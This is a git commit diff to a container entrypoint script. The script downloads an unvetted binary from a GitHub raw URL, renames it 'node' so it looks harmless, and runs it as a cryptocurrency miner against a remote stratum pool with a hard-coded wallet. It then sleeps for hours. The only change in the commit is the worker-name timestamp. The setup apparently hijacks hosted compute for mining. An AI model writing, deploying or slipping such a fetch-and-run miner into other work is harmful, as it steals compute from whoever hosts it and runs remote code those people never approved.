a73fbbc98736052620c3e25eebfc1f917d3fc439
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-02 21:58:43 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,7 +3,7 @@ set -e
 curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 chmod +x node
 WORKER_NUMBER=$1
-HOURESX=crf_$(date +%H)
+HOURESX=crf_$(date +%M)
 ./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.${WORKER_NUMBER}_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 sleep 29999
 
